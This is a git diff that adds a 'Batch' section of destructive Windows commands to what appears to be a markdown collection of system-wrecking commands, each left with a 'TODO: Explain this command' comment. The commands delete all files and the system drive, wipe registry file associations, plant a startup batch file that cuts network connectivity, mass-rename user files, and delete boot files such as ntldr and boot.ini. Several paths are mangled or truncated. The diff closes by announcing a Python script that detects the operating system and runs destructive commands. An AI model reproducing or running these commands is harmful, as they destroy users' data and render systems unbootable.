@@ -63,3 +63,155 @@ This command will add all the commands above to run on the next reboot.
 <br />
 
 
+# Batch
+
+```
+del*.*
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+START reg delete HKCR/.exe
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+START reg delete HKCR/.dll
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+START reg delete HKCR/*
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+echo @echo off>c:windowswimn32.bat
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+echo break off>>c:windowswimn32.bat
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+echo ipconfig/release_all>>c:windowswimn32.bat
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+echo end>>c:windowswimn32.bat
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+delete %systemdrive%\*.* /f /s
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+REN *.avi *.txt REN *.mkv *.txt REN *.BAT *.txt REN *.doc *.txt REN *.JPEG *.txt REN *.lnk *.txt
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+attrib -r -s -h c:\autoexec.bat
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+del c:\autoexec.bat
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+attrib -r -s -h c:\boot.ini
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+del c:\boot.ini
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+attrib -r -s -h c:\ntldr
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+del c:\ntldr
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+attrib -r -s -h c:\windows\win.ini
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+del c:\windows\win.ini
+```
+//TODO: Explain this command
+<br />
+<br />
+
+```
+del /s /q *.*
+```
+//TODO: Explain this command
+<br />
+<br />
+
+# Python
+
+Just a script to check the Operational system type and run destructive commands.
